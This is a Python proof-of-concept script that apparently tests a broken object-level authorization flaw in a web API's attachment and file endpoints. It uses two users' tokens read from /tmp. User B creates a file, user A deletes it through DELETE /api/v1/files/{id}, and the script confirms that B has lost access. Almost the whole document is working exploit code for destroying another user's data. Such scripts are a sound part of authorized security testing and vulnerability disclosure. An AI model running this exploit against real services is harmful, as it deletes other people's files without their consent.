import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TA=open('/tmp/tok_A').read().strip()
TB=open('/tmp/tok_B').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','90','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TA),'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='zx'+uuid.uuid4().hex[:8]
print("=== STEP 1: B(230) creates a file via attachments/html (returns file id) ===")
c,b=req('POST','/api/v1/attachments/html',
        {"html":f"<h1>ZX-VICTIM-{tag}</h1>","type":"word",
         "attachableType":"AuditableEntity","attachableId":"96","fileName":f"zx-{tag}-VICTIM"},tok=TB)
print(f"  gen -> {c} {b[:150].replace(chr(10),' ')}")
if c=='200':
    aid=json.loads(b)['attachmentId']
    c2,b2=req('GET',f'/api/v1/attachments/{aid}',tok=TB)
    a=json.loads(b2)['attachments'][0]
    fid=a['file_id']
    print(f"  attachment={aid} -> file_id={fid}")
    print("\n=== STEP 2: control - B can read it ===")
    c,b=req('GET',f'/api/v1/files/{fid}',tok=TB)
    print(f"  B GET -> {c}")
    print("\n=== STEP 3: A(231) DELETES B's file ===")
    c,b=req('DELETE',f'/api/v1/files/{fid}',tok=TA)
    print(f"  A DELETE /files/{fid} -> {c} {b[:180].replace(chr(10),' ')}")
    print("\n=== STEP 4: B loses access to its own file ===")
    c,b=req('GET',f'/api/v1/files/{fid}',tok=TB)
    print(f"  B GET -> {c} {b[:220].replace(chr(10),' ')}")
    open('/tmp/deleted_fid','w').write(str(fid))
